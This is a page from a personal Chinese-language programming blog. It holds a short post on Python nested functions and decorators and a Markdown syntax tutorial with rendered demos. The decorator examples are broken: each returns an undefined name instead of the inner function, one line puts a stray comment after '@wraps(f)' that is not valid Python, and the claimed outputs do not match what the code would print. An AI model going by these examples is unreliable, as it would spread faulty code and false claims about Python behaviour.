<p><strong>注：</strong><br><strong>如果想打印函数返回值一定要用输出函数，如果print(v())输出其返回值。</strong><br>  <strong>如果print(v)则输出其地址</strong>  </p>
<p>函数内也可以定义函数，这种函数称之为内嵌函数，内嵌函数是私密的，因此不可在函数外调用，我们往<br>往将其作为返回值而进行调用。</p>
<p>return 可以返回多个值，其值可以被传递，但是应当注意，尽量不要用golbal返回值，涂添烦恼</p>
<hr>
<ul>
<li><strong>装饰器的实质</strong>  </li>
</ul>
<p>对于装饰器而言，实际上是一个函数，只不过其参数也是个函数。应当注意的是传递函数时应使用其函数名而不加括号，其函数名将作为参数而传递。  </p>
<p>语法有如下两种：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(f)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">lmt</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">		f()</span><br><span class="line">	<span class="keyword">return</span> abc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dyf</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">'dyf'</span>)</span><br><span class="line"></span><br><span class="line">dyf()</span><br><span class="line">dyf = a(dyf)</span><br><span class="line">dyf()</span><br><span class="line">print(dyf.__name__)</span><br><span class="line">输出结果为：</span><br><span class="line">					dyf</span><br><span class="line">					abc</span><br><span class="line">					dyf</span><br><span class="line">					abc      <span class="comment">#dyf函数的名和注释文档被重写(docstring)  </span></span><br><span class="line">=============================================================================  </span><br><span class="line"><span class="number">2.</span><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(f)</span>:</span></span><br><span class="line"><span class="meta">	@wraps(f)  @这个函数保留原函数名</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">lmt</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">		f()</span><br><span class="line">	<span class="keyword">return</span> abc</span><br><span class="line"><span class="meta">@a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dyf</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">'dyf'</span>)</span><br><span class="line">dyf()	</span><br><span class="line">输出结果为:</span><br><span class="line">				abc</span><br><span class="line">				dyf</span><br></pre></td></tr></table></figure>
<hr>
<p>以上两种方式效果完全相同，只是@方式是其简便写法，装饰器的本质即： 以函数调用函数的方式来对被调用函数进行修饰，但要注意 在函数调用的过程中应当以函数名作为参数 在执行函数时才加括号。</p>
<p> 若要保留被装饰函数的真是名需要调用functools模块的wraps()函数，语法为 @wraps(f)，实际上wraps()函数本身就是一个装饰器，只不过其参数是一个函数罢了。</p>
<h5 id="Ps-这是我对装饰器的简单初步理解，以后会进一步补充。"><a href="#Ps-这是我对装饰器的简单初步理解，以后会进一步补充。" class="headerlink" title="Ps.这是我对装饰器的简单初步理解，以后会进一步补充。"></a>Ps.这是我对装饰器的简单初步理解，以后会进一步补充。</h5>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/tutorial/">tutorial</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/markdown-tutorial/">markdown-tutorial</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下markdown的语法"><a href="#记录一下markdown的语法" class="headerlink" title="记录一下markdown的语法"></a>记录一下markdown的语法</h3><hr>
<ul>
<li>语义标记:</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:right">描述</th>
<th style="text-align:center">样式</th>
<th style="text-align:left">代码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">加粗</td>
<td style="text-align:center"><strong>dyf</strong></td>
<td style="text-align:left"><code>** dyf **</code></td>
</tr>
<tr>
<td style="text-align:right">斜体</td>
<td style="text-align:center"><em>dyf</em></td>
<td style="text-align:left"><code>* dyf *</code></td>
</tr>
<tr>
<td style="text-align:right">加粗斜体</td>
<td style="text-align:center"><em> <strong>dyf</strong> </em></td>
<td style="text-align:left"><code>* ** dyf ** *</code></td>
</tr>
<tr>
<td style="text-align:right">删除线</td>
<td style="text-align:center"><del>dyf</del></td>
<td style="text-align:left"><code>~~ dyf ~~</code></td>
</tr>
</tbody>
</table>
<ul>
<li>语义标签:</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:right">描述</th>
<th style="text-align:center">样式</th>
<th style="text-align:left">代码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">上标</td>
<td style="text-align:center">dyf<sup>s<sup></sup></sup></td>
<td style="text-align:left"><code>dyf&lt;sup&gt;s&lt;sup&gt;</code></td>
</tr>
<tr>
<td style="text-align:right">下标</td>
<td style="text-align:center">dyf<sub>s<sub></sub></sub></td>
<td style="text-align:left"><code>dyf&lt;sub&gt;s&lt;sub&gt;</code></td>
</tr>
<tr>
<td style="text-align:right">键盘文本</td>
<td style="text-align:center"><kbd>Ctrl<kbd></kbd></kbd></td>
<td style="text-align:left"><code>&lt;kbd&gt;Ctrl&lt;kbd&gt;</code></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><strong>标题：</strong></li>
</ul>
<p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dyf</span><br><span class="line">## dyf</span><br><span class="line">### dyf</span><br><span class="line">#### dyf </span><br><span class="line">##### dyf</span><br><span class="line">###### dyf</span><br><span class="line">####### dyf     //错误的代码</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>demo：</strong></p>
<h1 id="dyf"><a href="#dyf" class="headerlink" title="dyf"></a>dyf</h1><h2 id="dyf-1"><a href="#dyf-1" class="headerlink" title="dyf"></a>dyf</h2><h3 id="dyf-2"><a href="#dyf-2" class="headerlink" title="dyf"></a>dyf</h3><h4 id="dyf-3"><a href="#dyf-3" class="headerlink" title="dyf"></a>dyf</h4><h5 id="dyf-4"><a href="#dyf-4" class="headerlink" title="dyf"></a>dyf</h5><h6 id="dyf-5"><a href="#dyf-5" class="headerlink" title="dyf"></a>dyf</h6><hr>
<p>＃号之所以能加粗是因为markdown本质是用语法糖封装的html语言，而html只有6种title-size，所以最多加6个#号</p>
<ul>
<li><p><em>分级标题</em><br>code：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dyf</span><br><span class="line">=========</span><br><span class="line">  Stella Del Mattino</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>Demo:</p>
<h1 id="dyf-6"><a href="#dyf-6" class="headerlink" title="dyf"></a>dyf</h1><h2 id="Stella-Del-Mattino"><a href="#Stella-Del-Mattino" class="headerlink" title="Stella Del Mattino"></a>Stella Del Mattino</h2><hr>
<ul>
<li><strong>引用：</strong></li>
</ul>
<p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;dyf</span><br><span class="line"></span><br><span class="line">&gt;&gt;is</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;really</span><br><span class="line"></span><br><span class="line">&gt;&gt;cool</span><br><span class="line"></span><br><span class="line">&gt;!     //注意每行空开</span><br></pre></td></tr></table></figure></p>
<p>Demo:</p>
<blockquote>
<p>dyf</p>
</blockquote>
<blockquote>
<blockquote>
<p>is</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>really</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>cool</p>
</blockquote>
</blockquote>
<blockquote>
<p>!</p>
</blockquote>
<hr>
<ul>
<li><strong>行内标记：</strong></li>
</ul>
<p>Demo:</p>
<p>PHP是世界上<code>最好</code>的语言</p>
<p>Code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP是世界上`最好`的语言  //标记代码将变为一行</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>代码块：</strong></li>
</ul>
<p>Demo:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"dyf is really cool"</span>);</span><br></pre></td></tr></table></figure></p>
<p>Code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">` ` `C   //language</span><br><span class="line">printf(&quot;dyf is really cool&quot;);</span><br><span class="line">` ` `</span><br></pre></td></tr></table></figure></p>
<p>不同的语言可以显示不同的高亮，但与主题有关。</p>
<hr>
<ul>
<li><strong>插入链接：</strong></li>
</ul>
<p>Demo:</p>
<ol>
<li><a href="http://laravel-china.org/docs/laravel/5.5/" target="_blank" rel="noopener">lavarel toturial</a></li>
<li><a href="http://codeforces.com/" target="_blank" rel="noopener">codeforces</a></li>
</ol>
<p>Code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[lavarel torurial](http://laravel-china.org/docs/laravel/5.5/)</span><br><span class="line"></span><br><span class="line">[codeforces][1]</span><br><span class="line">[1]http://codeforces.com/   //这是引入式写法</span><br></pre></td></tr></table></figure></p>
<hr>
<ul>
<li><strong>插入图片</strong></li>
</ul>
<p>Demo：</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/%E7%A8%BB%E5%9F%8E.jpeg?raw=true" alt="稻城"></p>
<p>Code：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![稻城](https://github.com/Explainaur/dyf_Blog/blob/master/images/a.jpg?raw=true)</span><br></pre></td></tr></table></figure></p>
<p>上传照片需要图床，可用github当图床，语法格式与链接一致。</p>
<hr>
<p>到这里差不多就说完了，还有流程图和时序图没有讲，因为我的模板不兼容。</p>
<p>Ps：写道插入图片的时候我在听canon，这是世界上最好听的曲子，突然想起了和我一起去稻城亚丁的两个傻子。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
</section>

  
  <nav class="pagination">
      <a class="extend prev" rel="prev" href="/">< Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next ></a>
  </nav>


        </div>
      </main>

      <footer class="footer syuanpi fadeIn" id="footer">
  <hr>
  <div class="footer-wrapper">
    <div class="left">
      <div class="contact-icon">
    
    
    
    
    
    
    
    
    
        
        
        
        
        
            <a href="https://www.facebook.com/dong.yifan.1" class="iconfont icon-social-facebook" title="facebook"></a>
        
        
        
        
    
        
        
        
            <a href="https://twitter.com/dong_yifan" class="iconfont icon-social-twitter" title="twitter"></a>
        
        
        
        
        
        
    
        
        
        
        
            <a href="https://www.zhihu.com/people/aurora-56-20/activities" class="iconfont icon-zhihu" title="zhihu"></a>
        
        
        
        
        
    
        
            <a href="https://github.com/Explainaur" class="iconfont icon-social-github" title="github"></a>
        
        
        
        
        
        
        
        
    
</div>

    </div>
    <div class="right">
      <div class="copyright">
    <div class="info">
        <span>&copy;</span>
        <span>2016 ~ 2020</span>
        <span>❤</span>
        <span>dyf</span>
    </div>
    <div class="theme">
        <span>
            Powered by
            <a href="http://hexo.io/" target="_blank">Hexo </a>
        </span>
        <span>
            Theme
            <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
        </span>
    </div>
    
</div>

    </div>
  </div>
</footer>
    </div>
  </div>
  <script src="/script/lib/jquery/jquery-3.2.1.min.js"></script>


  <script src="/script/lib/lightbox/js/lightbox.min.js"></script>








<script src="/script/src/nlvi.js"></script>

  <script src="/script/scheme/banderole.js"></script>

<script src="/script/bootstarp.js"></script>


<div class="backtop syuanpi melt toTop" id="backtop">
    <i class="iconfont icon-up"></i>
    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
</div>


  <div class="search" id="search">
    <div class="mask" id="mask"></div>
    <div class="search-wrapper syuanpi">
      <h2 id="search-header" class="syuanpi">Search？</h2>
      <div class="input">
        <input type="text" id="local-search-input" results="0" name>
      </div>
      <div id="local-search-result"></div>
    </div>
  </div>


</body>
</html>
